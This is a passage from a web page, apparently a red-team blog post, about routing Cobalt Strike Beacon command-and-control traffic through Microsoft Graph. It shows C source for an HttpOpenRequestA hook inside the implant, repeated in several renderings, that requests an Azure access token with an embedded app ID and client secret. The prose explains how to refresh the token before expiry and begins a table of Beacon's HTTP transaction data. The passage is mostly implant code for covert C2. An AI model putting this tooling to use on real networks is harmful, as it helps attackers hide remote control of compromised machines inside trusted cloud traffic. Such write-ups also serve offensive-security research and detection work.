class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"/%s/oauth2/v2.0/token"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, TENANT_ID</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Allocate and assemble content</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            reqSize = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">APP_CLIENT_ID</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">APP_CLIENT_SECRET</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">GRAPH_ADDRESS</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + </span></div></div><div class=""><div><span class="enlighter-text">                pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"grant_type=client_credentials&amp;client_id=&amp;client_secret=&amp;scope=https\%3A\%2F\%2F\%2F.default"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> + 1;</span></div></div><div class=""><div><span class="enlighter-text">            content = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">reqSize, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">sprintf</span><span class="enlighter-g1">(</span><span class="enlighter-text">content, </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"grant_type=client_credentials&amp;client_id=%s&amp;client_secret=%s&amp;scope=https%%3A%%2F%%2F%s%%2F.default"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, APP_CLIENT_ID, APP_CLIENT_SECRET, GRAPH_ADDRESS</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Make web request</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            response = </span><span class="enlighter-m0">MakeWebRequest</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                       </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"login.microsoft.com"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                       tempUri, </span></div></div><div class=""><div><span class="enlighter-text">                                       POST_VERB, </span></div></div><div class=""><div><span class="enlighter-text">                                       headers, </span></div></div><div class=""><div><span class="enlighter-text">                                       content, </span></div></div><div class=""><div><span class="enlighter-text">                                       pMemAddrs</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!response</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">                </span><span class="enlighter-k0">return</span><span class="enlighter-text"> INVALID_HANDLE_VALUE;  </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Parse out returned auth token</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k5">char</span><span class="enlighter-text">* delimiter = </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"access_token\":\""</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-k5">char</span><span class="enlighter-text">* accessToken = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strstr</span><span class="enlighter-g1">(</span><span class="enlighter-text">response, delimiter</span><span class="enlighter-g1">)</span><span class="enlighter-text"> + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">delimiter</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            </span><span class="enlighter-c0">// Null terminate accessToken to remove brackets and quotes</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">memset</span><span class="enlighter-g1">(</span><span class="enlighter-text">accessToken + pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strlen</span><span class="enlighter-g1">(</span><span class="enlighter-text">accessToken</span><span class="enlighter-g1">)</span><span class="enlighter-text"> - 2, 0, 2</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...         </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">&lt;code data-language="none"&gt;SECTION( D ) HINTERNET HttpOpenRequestA_Hook( HINTERNET hInternet, 
                                               LPCSTR lpszVerb, 
                                               LPCSTR lpszObjectName, 
                                               LPCSTR lpszVersion, 
                                               LPCSTR lpszReferrer, 
                                               LPCSTR *lplpszAcceptTypes,
                                               DWORD dwFlags, DWORD_PTR dwContext )
{
    HINTERNET       hResult = INVALID_HANDLE_VALUE;
    LARGE_INTEGER   currentTime, frequency;
    PVOID           verb, uri, tempUri, headers, content, response;
    size_t          reqSize;
    int             elapsedTime;
    CHAR            size[10] = {0};
    CHAR            id[100] = {0};

    ... Trimmed for Brevity ...

            // ------------------------------------ Get Access Token ---------------------------------------

            // Define headers to be used
            headers = C_PTR ( OFFSET ( "Host: login.microsoft.com\r\nContent-Type: application/x-www-form-urlencoded" ) );

            // Allocate and assemble uri
            reqSize = pMemAddrs-&gt;Api.msvcrt.strlen(TENANT_ID) + pMemAddrs-&gt;Api.msvcrt.strlen( C_PTR ( OFFSET ( "//oauth2/v2.0/token" ) ) ) + 1;
            tempUri = pMemAddrs-&gt;Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs-&gt;Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "/%s/oauth2/v2.0/token" ) ), TENANT_ID);

            // Allocate and assemble content
            reqSize = pMemAddrs-&gt;Api.msvcrt.strlen(APP_CLIENT_ID) + pMemAddrs-&gt;Api.msvcrt.strlen(APP_CLIENT_SECRET) + pMemAddrs-&gt;Api.msvcrt.strlen(GRAPH_ADDRESS) + 
                pMemAddrs-&gt;Api.msvcrt.strlen( C_PTR ( OFFSET ( "grant_type=client_credentials&amp;client_id=&amp;client_secret=&amp;scope=https\%3A\%2F\%2F\%2F.default" ) ) ) + 1;
            content = pMemAddrs-&gt;Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs-&gt;Api.msvcrt.sprintf(content, C_PTR ( OFFSET ( "grant_type=client_credentials&amp;client_id=%s&amp;client_secret=%s&amp;scope=https%%3A%%2F%%2F%s%%2F.default" ) ), APP_CLIENT_ID, APP_CLIENT_SECRET, GRAPH_ADDRESS);

            // Make web request
            response = MakeWebRequest(pMemAddrs-&gt;hInternet, 
                                       C_PTR ( OFFSET ( "login.microsoft.com" ) ), 
                                       tempUri, 
                                       POST_VERB, 
                                       headers, 
                                       content, 
                                       pMemAddrs);
            if (!response)
                return INVALID_HANDLE_VALUE;  

            // Parse out returned auth token
            char* delimiter = C_PTR ( OFFSET ( "access_token\":\"" ) );
            char* accessToken = pMemAddrs-&gt;Api.msvcrt.strstr(response, delimiter) + pMemAddrs-&gt;Api.msvcrt.strlen(delimiter);

            // Null terminate accessToken to remove brackets and quotes
            pMemAddrs-&gt;Api.msvcrt.memset(accessToken + pMemAddrs-&gt;Api.msvcrt.strlen(accessToken) - 2, 0, 2);

    ... Trimmed for Brevity ...         
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">&lt;code data-language="none"&gt;SECTION( D ) HINTERNET HttpOpenRequestA_Hook( HINTERNET hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR lpszVerb,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR lpszObjectName,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR lpszVersion,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR lpszReferrer,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR *lplpszAcceptTypes,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwFlags, DWORD_PTR dwContext )
{
&nbsp;&nbsp;&nbsp;&nbsp;HINTERNET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hResult = INVALID_HANDLE_VALUE;
&nbsp;&nbsp;&nbsp;&nbsp;LARGE_INTEGER&nbsp;&nbsp;&nbsp;currentTime, frequency;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verb, uri, tempUri, headers, content, response;
&nbsp;&nbsp;&nbsp;&nbsp;size_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reqSize;
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elapsedTime;
&nbsp;&nbsp;&nbsp;&nbsp;CHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size[10] = {0};
&nbsp;&nbsp;&nbsp;&nbsp;CHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;id[100] = {0};

&nbsp;&nbsp;&nbsp;&nbsp;... Trimmed for Brevity ...

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// ------------------------------------ Get Access Token ---------------------------------------

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Define headers to be used
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers = C_PTR ( OFFSET ( "Host: login.microsoft.com\r\nContent-Type: application/x-www-form-urlencoded" ) );

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Allocate and assemble uri
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reqSize = pMemAddrs-&gt;Api.msvcrt.strlen(TENANT_ID) + pMemAddrs-&gt;Api.msvcrt.strlen( C_PTR ( OFFSET ( "//oauth2/v2.0/token" ) ) ) + 1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tempUri = pMemAddrs-&gt;Api.msvcrt.calloc(reqSize, sizeof(char));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "/%s/oauth2/v2.0/token" ) ), TENANT_ID);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Allocate and assemble content
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reqSize = pMemAddrs-&gt;Api.msvcrt.strlen(APP_CLIENT_ID) + pMemAddrs-&gt;Api.msvcrt.strlen(APP_CLIENT_SECRET) + pMemAddrs-&gt;Api.msvcrt.strlen(GRAPH_ADDRESS) +&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.strlen( C_PTR ( OFFSET ( "grant_type=client_credentials&amp;client_id=&amp;client_secret=&amp;scope=https\%3A\%2F\%2F\%2F.default" ) ) ) + 1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;content = pMemAddrs-&gt;Api.msvcrt.calloc(reqSize, sizeof(char));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.sprintf(content, C_PTR ( OFFSET ( "grant_type=client_credentials&amp;client_id=%s&amp;client_secret=%s&amp;scope=https%%3A%%2F%%2F%s%%2F.default" ) ), APP_CLIENT_ID, APP_CLIENT_SECRET, GRAPH_ADDRESS);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Make web request
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response = MakeWebRequest(pMemAddrs-&gt;hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR ( OFFSET ( "login.microsoft.com" ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tempUri,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;POST_VERB,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;content,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!response)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return INVALID_HANDLE_VALUE;&nbsp;&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Parse out returned auth token
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char* delimiter = C_PTR ( OFFSET ( "access_token\":\"" ) );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char* accessToken = pMemAddrs-&gt;Api.msvcrt.strstr(response, delimiter) + pMemAddrs-&gt;Api.msvcrt.strlen(delimiter);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Null terminate accessToken to remove brackets and quotes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.memset(accessToken + pMemAddrs-&gt;Api.msvcrt.strlen(accessToken) - 2, 0, 2);

&nbsp;&nbsp;&nbsp;&nbsp;... Trimmed for Brevity ...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
}</pre>
</div>
</div>
</div>
<p>This technique fortunately proved entirely viable. <span id="4e24e246-ff96-4101-9c0c-725317c6da6b" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="4e24e246-ff96-4101-9c0c-725317c6da6b">At line 33</span> we assemble the content buffer by specifying the Azure app ID as well as the app client secret (which is again the app’s ‘password’). ‘MakeWebRequest’ is called at line 36 and returns the PVOID response variable, which contains the access token we require. Remember, this code resides in the HttpOpenRequestA_Hook function which is called each time Beacon starts a http-get cycle. This provides the opportunity to gate the ‘get access token’ code behind conditional requirements like “On the very first request you make, as well any time that it has been more than 3100 seconds since you last got an access token, run this code”. Being that Azure access tokens are good for 3600 seconds, we can ensure that Beacon will automatically retrieve a new access token in advance of when the old one expires.</p>
<h4 id="Beacon-Data-and-Profile-Language" data-renderer-start-pos="50098"><span class="ez-toc-section" id="Beacon_Data_and_Profile_Language" ez-toc-data-id="#Beacon_Data_and_Profile_Language"></span>Beacon Data and Profile Language<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="50132">Those familiar with Cobalt Strike will know that Beacon is highly customizable via the malleable profile. The settings contained within it are propagated to all Beacons produced by the TS and control a wide range of behaviors. The ones we are concerned with at this stage are those related to how Beacon sends C2 traffic. This table of a <a class="cc-tgpl01" title="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_beacon-http-transaction-walkthru.htm#_Toc65482844" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_beacon-http-transaction-walkthru.htm#_Toc65482844" data-testid="link-with-safety" data-renderer-mark="true">Beacon HTTP Transaction</a> sheds more light on what data is sent in each step of a <span id="315422a2-5bc6-4984-b2aa-a1f074ac2c07" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="315422a2-5bc6-4984-b2aa-a1f074ac2c07">transaction</span>:</p>
<div class="pm-table-container with-shadow-observer" data-layout="custom">
<div class="pm-table-wrapper">
<table data-testid="renderer-table" data-number-column="false" data-table-width="760">
<colgroup>
<col>
<col>
<col>
<col></colgroup>
<tbody>
<tr>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="50567"><strong data-renderer-mark="true">Request</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="50578"><strong data-renderer-mark="true">Component</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="50591"><strong data-renderer-mark="true">Block</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
<th class="ak-renderer-tableHeader-sortable-column__wrapper" colspan="1" rowspan="1" aria-sort="none">
<div class="ak-renderer-tableHeader-sortable-column">
<p data-renderer-start-pos="50600"><strong data-renderer-mark="true">Data</strong></p>
<figure class="ak-renderer-tableHeader-sorting-icon__wrapper ak-renderer-tableHeader-sorting-icon__no-order">
<div role="presentation">
<div class="ak-renderer-tableHeader-sorting-icon cc-gls7uu" tabindex="0" role="button" aria-label="No sort applied to the column" aria-disabled="false">
<div class="sorting-icon-svg__no_order ak-renderer-tableHeader-sorting-icon-inactive cc-37qivc">
<div class="cc-1h55k8m"></div>
</div>
</div>
</div>
</figure>
</div>
</th>
</tr>
<tr>
<td colspan="1" rowspan="1">
<p data-renderer-start-pos="50610">http-get</p>
</td>
<td colspan="1" rowspan="1">
